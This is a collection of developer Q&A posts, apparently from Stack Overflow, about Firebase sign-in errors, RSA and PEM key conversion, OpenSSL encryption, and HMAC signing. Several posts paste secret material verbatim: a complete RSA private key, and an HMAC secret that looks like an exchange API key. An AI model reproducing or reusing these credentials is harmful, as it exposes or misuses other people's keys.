  console.log(&quot;auth settings in SignInForm&quot;, auth.settings);

  const recaptchaVerifier = new RecaptchaVerifier(
    &quot;recaptcha-container&quot;,
    auth
</code></pre>
<p>Additional notes:</p>
<ul>
<li>I've already seen the discussion about the argument order. If the auth instance is in the final position, I get the above error. If it is in the first position, as many have suggested I get <code>Uncaught FirebaseError: Firebase: Error (auth/argument-error).</code></li>
<li>The console.log above logs the object <code>{appVerificationDisabledForTesting: true}</code> at runtime.</li>
<li>Both active and commented out approaches to setting the value to true in firebaseModular.js produce the same logs and errors.</li>
</ul>
<p>UPDATE
Attempted @Rainy sidewalks solution removing all related code from firebaseModular.js and updating SignInForm.jsx as follows:</p>
<pre><code>import { auth, firebaseApp } from &quot;../../constants/firebaseModular&quot;;
import { getAuth } from &quot;firebase/auth&quot;;

const SignInForm = () =&gt; {
 ...

  console.log(&quot;auth settings in SignInForm before&quot;, auth.settings);
  getAuth(firebaseApp).settings.appVerificationDisabledForTesting = true;
  console.log(&quot;auth settings in SignInForm after&quot;, auth.settings);
  const recaptchaVerifier = new RecaptchaVerifier(
    &quot;recaptcha-container&quot;,
    getAuth(firebaseApp)
  );
</code></pre>
"
"<p>After completing sign up with google I navigate back to my sign up form but i need to redirect to &quot;/&quot;.</p>
<p>Code:</p>
<pre><code>  const handleGoogleSignUp = () =&gt; {
    signInWithRedirect(auth, provider);

    // router.push(&quot;/&quot;) example
  };

</code></pre>
"
"<p>I have this code for registering and saving user data:</p>
<pre><code> @objc func finishRegistering () {
        guard let password = passwordTextField.text, isValidPassword(password) else {
            presentCustomAlert(withTitle: LocalizedString.invalidPassword.translated, message: LocalizedString.passwordRules.translated)
            return
        }
        
        Auth.auth().createUser(withEmail: email, password: password ) { [weak self] authResult, error in
            
            if let error = error {
                print(error)
                return
            }
            
            guard let strongSelf = self, let authResult = authResult else { return }
            
            strongSelf.saveUserDetails(firstname: strongSelf.firstName, lastname: strongSelf.lastName, userID: authResult.user.uid)
            
            strongSelf.navigateToHomePage()
        }
        
        
        
        
    }
    
    
    // MARK: -  Saving user details to the database .
    func saveUserDetails (firstname: String , lastname: String , userID: String ) {
        let databaseReference = Database.database().reference()
        
        let userReference = databaseReference.child(&quot;users&quot;).child(userID)
        
        let userdetails = [&quot;firstName&quot;: firstname , &quot;lastName&quot;: lastname ]
        
        userReference.setValue(userdetails) { error, _   in
            
            if let error = error {
                print(&quot;Erro saving user details &quot; , error )
                
            } else {
                print(&quot;User details saved successfully&quot;)
            }
            
        }
    }
</code></pre>
<p>I am getting this error:</p>
<pre><code>Error Domain=FIRAuthErrorDomain Code=17999 &quot;An internal error has occurred, print and inspect the error details for more information.&quot; UserInfo={FIRAuthErrorUserInfoNameKey=ERROR_INTERNAL_ERROR, NSLocalizedDescription=An internal error has occurred, print and inspect the error details for more information., NSUnderlyingError=0x600000d8d9b0 {Error Domain=FIRAuthInternalErrorDomain Code=3 &quot;(null)&quot; UserInfo={NSUnderlyingError=0x600000dbfde0 {Error Domain=com.google.HTTPStatus Code=400 &quot;(null)&quot; UserInfo={data={length = 220, bytes = 0x7b0a2020 22657272 6f72223a 207b0a20 ... 5d0a2020 7d0a7d0a }, data_content_type=application/json; charset=UTF-8}}, FIRAuthErrorUserInfoDeserializedResponseKey={
    code = 400;
    errors =     (
                {
            domain = global;
            message = &quot;CONFIGURATION_NOT_FOUND&quot;;
            reason = invalid;
        }
    );
    message = &quot;CONFIGURATION_NOT_FOUND&quot;;
}}}}
</code></pre>
<p>I tried updating firebase iOS sdk to latest version , downloaded new google plist and added that , tried cleaning build folder and packages and nothing works. How i can fix this error</p>
"
"<p>I tried the below code in my code.gs. I'm getting an error.</p>
<pre><code>  let privatekey = 'IcA3+ZwPmUMtAou4f9hJMg==';
  var key = `-----BEGIN PRIVATE KEY-----\n${privatekey}\n-----END PRIVATE KEY-----\n`;
  console.log(key)

  var signature = Utilities.computeRsaSha256Signature(&quot;this is my input&quot;, key);
  Logger.log(signature);
</code></pre>
<p>In the console I'm getting the key:</p>
<pre><code>-----BEGIN PRIVATE KEY-----
IcA3+ZwEmUMtAou4f9hHMg==
-----END PRIVATE KEY-----
</code></pre>
<p>Error: <strong>Exception: Invalid argument: key</strong></p>
<p>I have attached the ss of the error.
Can anyone help me with this error? why it's coming?
<a href=""https://i.stack.imgur.com/gFtgs.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/gFtgs.png"" alt=""Error Image"" /></a></p>
"
"<p>I am trying to understand the working of OpenSSL's EVP_EncryptUpdate function, specifically why does it return different cipher-text for same plaintext, key and IV (initially provided), over multiple calls. As far as I understand, the IV should be changed after each call, and the function takes care of the IV internally. The Question is how exactly is the IV handled internally? Trying to fetch the IV returns the same IV as the one the context is initialised with.</p>
<pre><code>#include &lt;openssl/ssl.h&gt;

void print_array(char *title, unsigned char *buff, int len)
{
    printf(&quot;%s:\n&quot;, title);
    for(int i = 0; i&lt;len; ++i)
        printf(&quot;%02x &quot;, buff[i]);
    printf(&quot;\n&quot;);
}

void handleErrors()
{
    printf(&quot;Error in encryption/decryption\n&quot;);
}

void encrypt_EVP_aes_256_gcm_init(EVP_CIPHER_CTX **ctx, unsigned char *key, unsigned char *iv)
{
    if(!(*ctx = EVP_CIPHER_CTX_new()))
        handleErrors();
    if(1 != EVP_EncryptInit_ex(*ctx, EVP_aes_256_gcm(), NULL, key, iv))
        handleErrors();
}

void encrypt(EVP_CIPHER_CTX *ctx, unsigned char *plaintext, int plaintext_len, unsigned char *ciphertext, int *ciphertext_len)
{
    int len;
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &amp;len, plaintext, plaintext_len))
        handleErrors();
    *ciphertext_len = len;
}

void test(const unsigned char* key, const unsigned char* iv, const unsigned char *data, int iters)
{
    unsigned char enc_data[32];

    int32_t cipherLength;
    EVP_CIPHER_CTX *encrypt_ctx;
    encrypt_EVP_aes_256_gcm_init(&amp;encrypt_ctx, key, iv);

    for(int i = 0; i&lt;iters; ++i)
    {
        print_array(&quot;iv&quot;, EVP_CIPHER_CTX_iv(encrypt_ctx), 12);    
    
        encrypt(encrypt_ctx, data, 32, enc_data, &amp;cipherLength);

        print_array(&quot;enc data&quot;, enc_data, cipherLength);
    }
}

int main()
{
    const unsigned char* key =             &quot;\x3c\x57\x5e\x25\x5f\x43\x41\x69\x3d\x5e\x48\x29\x72\x54\x27\x55\x3e\x29\x28\x65\x31\x34\x4a\x3e\x52\x2f\x7c\x6a\x7b\x25\x78\x52&quot;;
    const unsigned char* iv = &quot;\x75\x71\x71\x55\x36\x33\x59\x52\x2c\x22\x74\x7d\x6f\x36\x6d\x2e&quot;;
    const unsigned char data[32] = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;

    test(key, iv, data, 3);

    return 0;
}
</code></pre>
<p>I tried outputting the IV, but it does not seem to display the running IV. I only get back the supplied IV.</p>
"
"<p>I am building an app using Flutter and Firebase. I am trying to create a user profile on their first login to the app. I am using the Google sign-in method provided by Firebase authentication.</p>
<p>This is my code for the same:</p>
<pre class=""lang-dart prettyprint-override""><code>void _handleGoogleSignIn() async {
    try {
      GoogleAuthProvider googleAuthProvider = GoogleAuthProvider();
      UserCredential userCredential =
          await _auth.signInWithProvider(googleAuthProvider);
      User? user = userCredential.user;

      // check if user pf exists
      if (user != null) {
        DocumentSnapshot userDoc = await FirebaseFirestore.instance
            .collection(&quot;users&quot;)
            .doc(user.uid)
            .get();

        // if not there, then create
        if (!userDoc.exists) {
          await FirebaseFirestore.instance
              .collection(&quot;users&quot;)
              .doc(user.uid)
              .set(
            {
              &quot;photoUrl&quot;: user.photoURL,
              &quot;displayName&quot;: user.displayName,
              &quot;email&quot;: user.email,
            },
          );
        }
      }
    } catch (e) {
      showDialog(
        context: context,
        builder: (context) {
          return AlertDialog(
            content: Text(e.toString()),
          );
        },
      );
    }
  }
</code></pre>
<p>I am storing <code>displayName</code>, <code>photoUrl</code>, <code>email</code>, and other fields (still thinking). But on the Firestore window, it shows that the document was stored with <code>displayName</code> set to <code>null</code>.</p>
<p><a href=""https://i.stack.imgur.com/ydiYN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ydiYN.png"" alt=""null field"" /></a></p>
<p>So what am I doing wrong, and what is the fix?</p>
"
"<p>I want to create an RSA public key to secure my messages to server.
When I try to use <code>RsaPublicKey::new(n, e);</code>, but i don't know use this.</p>
<pre class=""lang-rust prettyprint-override""><code>use serde_json::{json, Value, Value as JsonValue};
use quick_xml::events::Event;
use quick_xml::reader::Reader;

use rsa::{RsaPublicKey, BigUint};

use crate::crypto::Crypto;
use crate::net::Tcp;


fn json_settings() -&gt; JsonValue {
    let json: Value = json!({
        &quot;key&quot;: &quot;0dc-2-7b-98d-94&quot; // censored
    });

    json
}

pub async fn get_key() {

    // Create and send information to the server
    let mut tcp = Tcp::setup_conn().await;
    let _s1 = tcp.send(&quot;yu&quot;);

    // If server send me ya, we send json_settings, then,
    // the server return public_key far a RSA encryption.
    if _s1 == &quot;ya&quot; {
        let _s2 = tcp.send(&amp;json_settings().to_string()); 
        
        let json_value: serde_json::Value = serde_json::from_str(&amp;_s2).unwrap();
        let xml = json_value[&quot;public_key&quot;].as_str().unwrap(); // server response.

        // -start-
        // Here, we retrieve the value from the json response's xml and store it in a list.
        let mut reader = Reader::from_str(xml);
        reader.trim_text(true);

        let mut txt = Vec::new();
        loop {
            match reader.read_event().unwrap() {
                Event::Text(e) =&gt; txt.push(e.unescape().unwrap().into_owned()),
                Event::Eof =&gt; break,
                _ =&gt; (),
            }
        }
        // -end-

        // here I have an encrypt() function, I give it my key as an argument,
        // which must be of type RsaPublicKey, and the given f to encrypt everything.
        Crypto::encrypt(txt[0], b&quot;hello&quot;);
        
        println!(&quot;{:?}&quot;, txt);
    }
}
</code></pre>
<p>Here is my function for encrypt message with the public key.</p>
<pre class=""lang-rust prettyprint-override""><code>
// Encrypt with public key.
pub fn encrypt(pub_key: RsaPublicKey, data: &amp;[u8]) -&gt; Vec&lt;u8&gt; {
    let mut rng = OsRng;
    pub_key
       .encrypt(&amp;mut rng, Pkcs1v15Encrypt, data)
       .expect(&quot;failed to encrypt&quot;)
}

</code></pre>
<p>And the error, but I know why, I wait just to know how converte my txt[0] (key) to RsaPublicKey, I think I should use <code>RsaPublicKey::new(n, e);</code>. (e = exponent &amp; n = part of the public key)</p>
<pre><code>error[E0308]: mismatched types
  --&gt; src/script.rs:50:25
   |
50 |         Crypto::encrypt(txt[0], b&quot;hello&quot;);
   |         --------------- ^^^^^^ expected `RsaPublicKey`, found `String`
   |         |
   |         arguments to this function are incorrect
</code></pre>
"
"<p>Is it possible to convert a public/private key I created in PHP (x509 format  I believe but not 100% sure) to a pkcs1 version (python) ? I have two apps one PHP and one in Python, and I would like them both to use the same key pairs as they will eventually communicate with each other. It doesn't seem to be possible as far as I can tell but could anyone advise if i'm going around in circles with this, or if indeed you can make a key pair work across both programming languages by converting one of them.</p>
<p>My Ultimate aim is:</p>
<p><strong>Python stores</strong> - Public key</p>
<p><strong>PHP stores</strong> - Private Key</p>
<p>Then both apps perform I/O with each other.</p>
<p>Example of Key made in PHP below (X509)</p>
<pre><code>-----BEGIN PUBLIC KEY----- 
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqh+pyERnrrSIlJFNcX5D
FI7vJVHlgN0qAVYBsRB7HHGmBXjkFhtbz0RmTE13effnNB5UJS3BzqLFAGib9JkF 
Df7HgnpdVf3pIE5g+2kL/abQ9r+U0qX7hqmwnEWyA60Htz7MpSq4p4q7CPSCeGez 
m7946u8+6jVgIX19YrrM7f4Ai6LBBEFtMG0ytnhVaKWl3kwGuHmCSRUhhZsaE4TZ 
1wce/UcAQSkmzEnflfqdc7IiM55ZPYkW8u9cIFgOhYv3du2Il9GH7E3PBt6aASH/ 
ct7MRP4gCAvoSEhn/t1/Hr/aHlSgH/OIHHK0GFrVUgZokxaYv+EWkfxC9/log5uG 
pQIDAQAB
-----END PUBLIC KEY-----


-----BEGIN PRIVATE KEY----- 
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCqH6nIRGeutIiU 
kU1xfkMUju8lUeWA3SoBVgGxEHsccaYFeOQWG1vPRGZMTXd59+c0HlQlLcHOosUA 
aJv0mQUN/seCel1V/ekgTmD7aQv9ptD2v5TSpfuGqbCcRbIDrQe3PsylKrinirsI 
9IJ4Z7Obv3jq7z7qNWAhfX1iuszt/gCLosEEQW0wbTK2eFVopaXeTAa4eYJJFSGF 
mxoThNnXBx79RwBBKSbMSd+V+p1zsiIznlk9iRby71wgWA6Fi/d27YiX0YfsTc8G 
3poBIf9y3sxE/iAIC+hISGf+3X8ev9oeVKAf84gccrQYWtVSBmiTFpi/4RaR/EL3 
+WiDm4alAgMBAAECggEAYWwEdFUH8vobhMi4ypd9npZDyOFfRi5g0acJDPbdKWrD 
ojqakzZTmxwWYPezxbr7QdNkaG4NoGGB4zwEo0vFo0AVzFh6frYK/J8l1pNPdJBE 
9ii79u1qXrFqG/Olf4lk88EYvDT8zaUaeoRa+syYBEbf3dnn84Nha4xLc3B5zodJ 
A1Ps31utrlHwLYJUHw81jT3aUmKJpV/dqnhb1D8FXd2PN6sNbsA1fDGSBAV5mFll 
u6F5btLwFKpSzCFgT/gbx4LFWR08ZLPpiMWXiUZm5wbBwB0lI8a4qZAXQmHqQokP 
Xj516VAqUdo0eh9sOAZu3h8YNtziOjs/bQoWsek4eQKBgQDfVH5dE7TPc5KjfbaK 
5yBGQDX0ZLMSlXCt35ad79YQlWpMGcvAu5988HiriCntHhOhSeNMNpu/QMmvVL/L 
XZvb9SRSvZzs3kEIP7mxqQi045frq5WxYB4N/nnJmSye4l8oogueTh45y2WrJxsy 
E6Oaiejx0AK5efIUEai0Wrhm5wKBgQDDAqPErtR6Mv/sMtUt76Iun+CfokEN316i 
6s1sDQRTpxCgfDFd7pK77p92LnqGoXpWQoHeRb94d7pCG8UkkvyzfHKyquq4wT2y 
UsDFJ4g+a/x63J43O/NHhW7X5ZShuSRr9+13JWD+P8aqQwIfJd23iST8o5KdDjwF 
c7jkiSYQkwKBgQCbbMhMqqxJPBuvoIvr+5Jgkct6/KILqukyeMrvu7x06ieCMum0 
hl8mqoywhCD5ntb2ht+jaNXXspUqaobYV5ti5yaSVtfhmYQU45Suaf9fNI3EPDP/ 
r+76ukGz5eBB6zVip/QCBkfO3RkylhK9NSHFKXlu4N8kihPJl8ibTA/NvQKBgG+t 
JFIveNjeOfdvCOw8jlk7D6z7g1vJbm3IH4ngTnkFdJ0jYjYTuQ5M0h8g8OQGt4OM 
pMjAkq0Pi6fuNVEDqBm1jA3LmY3ihE2J3IFLaVeuCbHmg+jHuUNdI6QaAqs21qfK 
HMCdtFUF+uRoaV+jFLzVmkvf9MdibncE1X5zGExnAoGAJp7Xe67ZvFrQH7AigXt7 
hxhsvd3/EExTWJx1aGc+aplI1dl8HR6tjBcJSR+uf2siI9B3OuLHaZZha2p/bcE6 
dt2vYbE0/oOunDiU6G3BJFE/gKIVwl4l8sknISLWO/uWg5puig3uK0wbqQawC6G5 
Ude0KAn2vkkHVAgj0oBSqNU=
-----END PRIVATE KEY-----
</code></pre>
<p>Thanks</p>
"
"<p>File &quot;C:\Users\user.virtualenvs\cinemahub-_4auLGIo\lib\site-packages\cryptography\exceptions.py&quot;, line 9, in 
from cryptography.hazmat.bindings._rust import exceptions as rust_exceptions
ImportError: DLL load failed while importing _rust: The specified procedure could not be found.</p>
<p>I uninstalled channels 3.0.5 and run python manage.py, the error disappeared. but the Asgi server wasnt showing on terminal. I installed channels 4.0.0 and Daphne but daphne causes the same error however when i remove daphne, the error disappears. I want the asgi server to show on the terminal.
I aslo installed and uninstalled cryptography numerous times yet error still appears</p>
"
"<p>When I am trying to connect my project with FIREBASE manually, this error occurs</p>
<pre><code> A problem occurred configuring root project 'android'. &gt; Could not resolve all files for configuration ':classpath'. &gt; Could not find com.google.gms.google-services:4.4.10:. Required by: project : * Try: &gt; Run with --stacktrace option to get the stack trace. &gt; Run with --info or --debug option to get more log output. &gt; Run with --scan to get full insights. * Get more help at https://help.gradle.org BUILD FAILED in 2s Exception: Gradle task assembleDebug failed with exit code 1
</code></pre>
<p>I have followed the tutorials, but in my case, it throws an error message. Please suggest to me where I am making a mistake.</p>
"
"<p>My project was scanned by <strong>CheckMarx</strong> and I got:</p>
<blockquote>
<p>&quot;Client Weak Cryptographic Hash&quot; : The application employs weak
hashing in <strong>sha1</strong></p>
</blockquote>
<p>for the angular service worker.
It found it on 3 different js files:</p>
<pre><code>ngsw-worker.js: return sha1(JSON.stringify(manifest));
safety-worker.js: return sha1(JSON.stringify(manifest));
worker-basic.min.js: return sha1(JSON.stringify(manifest));
</code></pre>
<p>Is there a way\version where the service worker uses a stronger hashing or a way to configure it?<br>
Copilot claims there is an <strong>&quot;integrity&quot;</strong> property I can use in the assetsGroups of the ngsw-config.json, but it is not recognized.
Thanks in advance.</p>
"
"<p>the algorithm in the header of the jwt is 'http://www.w3.org/2001/04/xmldsig-more#rsa-sha256',
but when pyjwt runs internally: <code>alg_obj = self.get_algorithm_by_name(alg)</code>
it raises:</p>
<pre><code>NotImplementedError: Algorithm not supported
</code></pre>
<p>If i manually replace alg to 'RS256' during debug it works</p>
<p>Why doesn't the library recognize the algorithm in the link format?</p>
"
"<pre><code>try {
  const result = await signInWithPopup(auth, facebookProvider);
  const { user } = result;
} catch (error) {
  if (error.code === &quot;auth/account-exists-with-different-credential&quot;) {
    try {
      // Check if the user has other providers linked to the same email
      const methods = await fetchSignInMethodsForEmail(auth, error.email);
      if (methods &amp;&amp; methods.length &gt; 0) {
        // User has other providers linked
        // Prompt user to sign in with the existing provider to link accounts
        const signInWithExistingProvider = async (provider) =&gt; {
          try {
            await signInWithRedirect(auth, provider);
            // Redirect will handle linking automatically
          } catch (linkError) {
            console.error(&quot;Error linking accounts:&quot;, linkError);
          }
        };

        // Example: Prompt user to sign in with Google
        // You can add more prompts for other providers if needed
        if (methods.includes(&quot;google.com&quot;)) {
          signInWithExistingProvider(googleProvider);
        }
      }
    } catch (linkError) {
      console.error(&quot;Error fetching sign-in methods:&quot;, linkError);
    }
  } else {
    console.log(&quot;Login Failed:&quot;, error);
  }
}
</code></pre>
<p>This is how I am handling the facebook login into my react app using firebase. I am using both Google login and facebook login for my react app, I am using firebase and I enabled both of these options in sign-in methods inside the authentication in firebase. What is happening is:
If a user login for the first time with his facebook, it is working fine and he logout and then tries using the Google sign-in method, it too works fine, then he logout and again tries to login using firebase, I got the error: FirebaseError: Firebase: Error (auth/account-exists-with-different-credential). For handling this, I tried the above method.
And now I am encountering with the error: Error fetching sign-in methods: FirebaseError: Firebase: Error (auth/missing-identifier). What is wrong with my code?`</p>
"
"<p>Crypto RSA Encryption randomly generates 255 bytes output instead of expected 256  in next.js application
This results in failure when decrypting the data.</p>
<p>Interestingly this works absolutely fine when using only NodeJS, But randomly gives the issue when run in the browser</p>
<p>Below is my code</p>
<pre><code>const publicKey = `-----BEGIN CERTIFICATE-----
MIIELzCCAxegAwIBAgIIArnMylZGlBgwDQYJKoZIhvcNAQELBQAwaTELMAkGA1UE
BhMCSU4xFDASBgNVBAgMC01haGFyYXNodHJhMQ8wDQYDVQQHDAZNdW1iYWkxDTAL
BgNVBAoMBEF4aXMxETAPBgNVBAsMCEF4aXNCYW5rMREwDwYDVQQDDAhBUElHV0JN
UzAeFw0yMTEwMjYwODQ2MjFaFw0yMzExMTUwODQ2MjFaMGkxCzAJBgNVBAYTAklO
MRQwEgYDVQQIDAtNYWhhcmFzaHRyYTEPMA0GA1UEBwwGTXVtYmFpMQ0wCwYDVQQK
DARBeGlzMREwDwYDVQQLDAhBeGlzQmFuazERMA8GA1UEAwwIQVBJR1dCTVMwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDLkALNhDxRPhW3clvfwgf8W2Wq
kWa/Te4Qkpn+jl/By2m6uu6nf6LBDDDfAbS1tzrn7BntQvowk4gY6umBTEOj9kfu
TUneWW9O3Qgao+Qe8IUySd92B4fKLtlsg4ugbkYi6YKz+Ab+cbzOZlR6Y8Yhf+JM
yfNIcj8tErmt3QtTergKtawtwwCr7vkDXSpkxNsmtFWVPBeC8YD9B1/01M7M/8bU
raVK1SD3ZrgCHi4ppEWbJMPuH0cUqhu1GOZFJyT/s5K5/1GsSbWmXzg4Gw3aZJoH
cdombtRH7VA5AWCchpxkLXk/QWKAbfb4XL7PwvgCz7eL6HCz00Jg0Wipjhh3AgMB
AAGjgdowgdcwDAYDVR0TBAUwAwEB/zAdBgNVHQ4EFgQU5JguYg2Bu0pa8zm3/m8C
+gWCKdIwgZoGA1UdIwSBkjCBj4AU5JguYg2Bu0pa8zm3/m8C+gWCKdKhbaRrMGkx
CzAJBgNVBAYTAklOMRQwEgYDVQQIDAtNYWhhcmFzaHRyYTEPMA0GA1UEBwwGTXVt
YmFpMQ0wCwYDVQQKDARBeGlzMREwDwYDVQQLDAhBeGlzQmFuazERMA8GA1UEAwwI
QVBJR1dCTVOCCAK5zMpWRpQYMAsGA1UdDwQEAwICvDANBgkqhkiG9w0BAQsFAAOC
AQEAsWnpwN9Pv7jSqOssAfb0UPqiE3q4J2G1M8HK/bjZEESaNmUX3ugBG5tsFLj9
RIjhxBMqpjzWGTrBhDItFiSecE/bb5a0TuZ3YWENp8MeShfpAkbldxiL2ivYNUL8
NNIXHm1WFRxcrjKsaUVeEJ7/IFP0r6eSX6Sg3HONWdw+yde0D+VJC5NAkjnmVJhd
eZcQXHuRmmwJWpSXvznewRbV+OhDWyY8MOs5RHqOhpi6IEwmFvdRXC4N5gM7eurp
diZWzhJiS5isDSVlx8ogeGLxxY/6wFixGzBS/1a1GMhvkLYylY/81IT7ViyI07QK
HqlxrbngzQkiAA/ydoXzdMEUQQ==
-----END CERTIFICATE-----`;

const rsaEncryption = (incomingData:string): string =&gt; {
    const rsaEncryptedData =  crypto?.publicEncrypt(
        {
            key:        publicKey,
            padding:    crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash:   &quot;SHA-1&quot;
        },
        Buffer.from(incomingData)
    );

      if(rsaEncryptedData.length &lt; 256) {
        //alert('short payload')
        console.error('xxx rsaEncryptedData length: ', rsaEncryptedData.length)
        console.error('xxx rsaEncryptedData: ', rsaEncryptedData)
        console.error('xxx incomingData: ', incomingData, '\n incomingData length: ', incomingData.length, '\n','\n ====end====')
    } else {
      console.log('success, expected output ', rsaEncryptedData.length)
}

   return { rsaEncryptedData }
}
// End RSA encryption function


///
    const startEncryption =() =&gt; {
        const data= 'CF9FNcUpvrzExofwhFKvxameOQoe8iZz'
        let codition = 256;
        while(codition &gt;= 256){
            const receivedData = rsaEncryption(data);
            codition = receivedData.rsaEncryptedData.length;
            if(codition &lt; 256) {
                alert();
                console.error('xxx receivedData:\n ', receivedData.rsaEncryptedData.length, '\n -----end-')
            }
        }
    }

startEncryption()


</code></pre>
<p>using in nextjs application current node version is v16.20.2</p>
"
"<p>I need to create a signature from a private key and a message in Python using HMAC SHA256.</p>
<p>The OpenSSL command, ran in the command window, is the following:</p>
<pre><code>echo -n &quot;recvWindow=0&amp;symbol=BTC-USDT&amp;timestamp=1696751141337&quot; | openssl dgst -sha256 -hmac &quot;mheO6dR8ovSsxZQCOYEFCtelpuxcWGTfHw7te326y6jOwq5WpvFQ9JNljoTwBXZGv5It07m9RXSPpDQEK2w&quot; -hex
SHA2-256(stdin)= 04003ddfe0e52231a2bdfe94e8d3f5a369522b82f28b7d5511414b4d7f87d698
</code></pre>
<p>The Python code used to recreate the same behavior is the following:</p>
<pre><code>def calcu(key, data):
    hmac_digest = hmac.new(key.encode(&quot;UTF-8&quot;),
                           data.encode(&quot;UTF-8&quot;),
                           hashlib.sha256).hexdigest()
    return hmac_digest

key = &quot;mheO6dR8ovSsxZQCOYEFCtelpuxcWGTfHw7te326y6jOwq5WpvFQ9JNljoTwBXZGv5It07m9RXSPpDQEK2w&quot;
data = &quot;recvWindow=0&amp;symbol=BTC-USDT&amp;timestamp=1696751141337&quot;

sign = calcu(key, data)

print(sign.upper())
</code></pre>
<p>yielding: F8D883609DFD31C824FEB4DE865B071008DEDB1D461451FA70847875C8E7A7A2</p>
<p>What tells me that there is some basic mistake that I am making is that if I use a simple string, like 333 for key and data, the results keep differing from the OpenSSL and Python implementation:</p>
<p>Example:</p>
<p>OpenSSL CMD</p>
<pre><code>echo -n &quot;333&quot; | openssl dgst -sha256 -hmac &quot;333&quot; -hex
SHA2-256(stdin)= 32fc726256e8a10d99fbef0d7b27fa51e932ea6cd76530fcfb4641057a813bd8
</code></pre>
<p>Python</p>
<pre><code>def calcu(key, data):
    hmac_digest = hmac.new(key.encode(&quot;UTF-8&quot;),
                           data.encode(&quot;UTF-8&quot;),
                           hashlib.sha256).hexdigest()
    return hmac_digest

key = &quot;333&quot;
data = &quot;333&quot;

sign = calcu(key, data)

print(sign.upper())
</code></pre>
<p>0006A5A7658EBA166B26B598748E821E943B769C97A6F366C723712E6CD92DEB
I also tried with b&quot;&quot; and r&quot;&quot; strings, no success with that neither.</p>
<p>What am I overlooking? I tried different encoding like UTF-8, 16, 32, ascii, and so on but none made this work</p>
<p>edit1: I am running Windows 10, OpenSSL 3.2.1 30 Jan 2024 (Library: OpenSSL 3.2.1 30 Jan 2024), Python 3.10, pyopenssl 24.0.0.</p>
<p>The problem was that Windows was not taking the -n as a parameter, but as part of the input. So, as Topaco and Tim Peters said, using /p= {...} solved it for me.</p>
"
"<p>First time user of tink (and overall cryptography noob, but I'm learning)</p>
<p>I'm able to create a private key using</p>
<p><code>tinkey create-keyset --key-template [MY TEMPLATE] --out-format json --out foo.json</code></p>
<p>then once I have that file I try to create the public keyset via</p>
<p><code>tinkey create-public-keyset --in-format=json --in=foo.json</code></p>
<p>The output is</p>
<pre><code>{&quot;primaryKeyId&quot;:3104918340,&quot;key&quot;:[{&quot;keyData&quot;:{&quot;typeUrl&quot;:&quot;type.googleapis.com/google.crypto.tink.HpkePublicKey&quot;,&quot;value&quot;:&quot;EgYIAxACGAIaYQTKiU+xhistDls5CMGMC311ZRfELnUGdfLXBx++SHiMOMOzsaFryaKljLlHHKegOeC6vbG8AXXpoPrvaouxtU5CgHCXGEczYwo9p/PHN4gKnJFfJJWCerzC5lEtV4SJUVo=&quot;,&quot;keyMaterialType&quot;:&quot;ASYMMETRIC_PUBLIC&quot;},&quot;status&quot;:&quot;ENABLED&quot;,&quot;keyId&quot;:3104918340,&quot;outputPrefixType&quot;:&quot;TINK&quot;}]}
</code></pre>
<p>So now I need to send pem across the wire to a server, but my server team keeps telling me that I'm giving them an invalid pem document. I was under the understanding that the valud in the json above is pem format. Any tips?</p>
"
"<p>While exploring the <code>firebase</code> npm module, I encourtered a sub-path called <code>web-extensions</code>. What is the use for this sub-path? I understand that usual firebase auth doesn't work in web extensions due to content security policies, so is the <code>web-extensions</code> sub-path useful in such case? If yes, is there any doc/example about how to use it?</p>
<p>I tried replacing <code>firebase/auth</code> with <code>firebase/web-extension/auth</code> but seems like <code>signInWithPopup</code> is not n exported function there?</p>
"
"<p>We have an app that is in production for quite some time now. A new developer was added to the project and he is trying to sign-in but he is the only one who can't.</p>
<p>What we have is an webapp running on angular@16.2.1, using angular/fire@7.6.1. We use Google Cloud Identity Platform running multi tenants and one of the tenants has Microsoft as a provider that hits a Microsoft Azure AD.</p>
<p>All other users so far, no problem, but this specific user throws the error:</p>
<blockquote>
<p><a href=""https://redacted.com/__/auth/handler?error=invalid_request&amp;error_description=AADSTS50194"" rel=""nofollow noreferrer"">https://redacted.com/__/auth/handler?error=invalid_request&amp;error_description=AADSTS50194</a>:
Application 'redacted'(redacted) is not configured as a multi-tenant
application. Usage of the /common endpoint is not supported for such
applications created after '10/15/2018'. Use a tenant-specific
endpoint or configure the application to be multi-tenant. // redacted
the rest of the message</p>
</blockquote>
<p>The code for signin is:</p>
<pre><code>import {
  Auth,
  OAuthProvider,
  SAMLAuthProvider,
  signInWithRedirect,
} from '@angular/fire/auth';

export class AuthDomainDataService {
private auth = inject(Auth);

signinWithProvider(
    requestParam: PayloadModel.SignInWithProvider
  ): Promise&lt;never&gt; {
    this.auth.tenantId = requestParam.tenantId;

    const isSAML = requestParam.provider === 'redacted';

    const provider = isSAML
      ? new SAMLAuthProvider(requestParam.provider)
      : new OAuthProvider(requestParam.provider);

    if (typeof provider === typeof OAuthProvider) {
      (provider as OAuthProvider).addScope('profile');
      (provider as OAuthProvider).addScope('email');
    }

    provider.setCustomParameters({
      login_hint: requestParam.email,
      tenant: requestParam.microsoftTenantId,
    });

    return signInWithRedirect(this.auth, provider);
  }
}
</code></pre>
<p>We have a custom login logic to fetch the tenants information that will be used for signin, some of our tenants are GCP &quot;default&quot; ones (MS, Google, etc) but we have a couple that are OIDC and SAML, thus the implementation of the conditional to check which provider class to use.</p>
<p>The rest of the code above is pretty much standard.</p>
<p>The problem, as mentioned, is that we have a single person at the moment who is unable to login, the Firebase SDK will eventually make a call to <a href=""https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=redacted"" rel=""nofollow noreferrer"">https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=redacted</a> and the response is a status code 400 with the error mentioned above.</p>
<p>Anyone has ever ran through this issue before. At first I though we had a race condition and the code would hit <code>signInWithRedirect</code> without the tenant and/or the <code>microsoftTenantId</code> being there, but that was not it, both are there.</p>
<p>I can't really think on other places to look for a solution, so I would welcome suggestions</p>
"
"<pre><code>// import the path module
const path = require('node:path');
const crypto = require('crypto');

// get the public key certificate
const CRTpath = path.basename('./PublicKey.crt');

const GenKey = crypto.randomBytes(32);

